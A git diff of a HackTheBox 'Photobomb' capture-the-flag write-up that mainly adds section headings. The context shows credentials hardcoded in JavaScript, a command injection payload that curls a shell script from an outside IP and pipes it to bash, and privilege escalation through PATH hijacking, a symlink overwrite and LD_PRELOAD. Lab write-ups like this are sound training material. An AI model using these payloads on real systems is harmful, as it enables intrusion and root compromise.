@@ -48,6 +48,9 @@ Target: http://photobomb.htb/
 [18:34:14] 200 -   11KB - /favicon.ico
 [18:34:34] 401 -  590B  - /printer
 ```
+
+## Hardcoded credentials in client side javascript
+
 in the html header of the homepage there's a reference to photobomb.js
 ```js
 function init() {
@@ -63,6 +66,8 @@ the credentials are hardcoded in there:
 ```
 pH0t0:b0Mb!
 ```
+
+## Footlhold through command injection in a POST parameter
 
 There's a possible command injection in the filetype parameter in the POST request when downloading an image
 ```bash
@@ -83,7 +88,9 @@ Upgrade-Insecure-Requests: 1
 photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png;curl%20http://10.10.15.78:8000/shell.sh|bash&dimensions=3000x2000cat ph
 ```
 
-once in the box wizard haaas sudo to a cleanup script with SETENV enabled, which means that we can bring environement variables over as we sudo 
+## Exploring potential privilege escalation vectors
+
+once in the box wizard has sudo to a cleanup script with SETENV enabled, which means that we can bring environement variables over as we sudo 
 ```bash
 $ sudo -l
 Matching Defaults entries for wizard on photobomb:
@@ -96,6 +103,9 @@ User wizard may run the following commands on photobomb:
 
 the cleanup script does a bunch of things that we can leverage:  
   
+
+## Privesc 1 - Path Hijacking
+
 first one is, find is not an absolute path so we can do some path highjacking, note that the cleanup scrip loads its own .bashrc, in which the path is specified, but because we of SETENV this still works.
 ```bash
 $ cat << EOF > find
@@ -118,6 +128,8 @@ wc -c /root/root.txt
 33 /root/root.txt
 ```
 
+## Privesc 2 - Symlink attack
+
 another way is, because the cleanup.sh does some kind of manual logrotate thing, where it copies .log to .log.old, we can delete both, symlink log.old to whatever thing we wanna overwrite as root, and put the content of what we wanna write in .log
 ```bash
 $ rm photobomb.*
@@ -131,6 +143,8 @@ $ cat << EOF > photobomb.log
 > EOF
 $ sudo /opt/cleanup
 ```
+
+## Privesc 3 - Dynamic Linker Hijacking
 
 and yet another way is to use `LD_PRELOAD` to load a so lib that will be loaded by find
 ```c
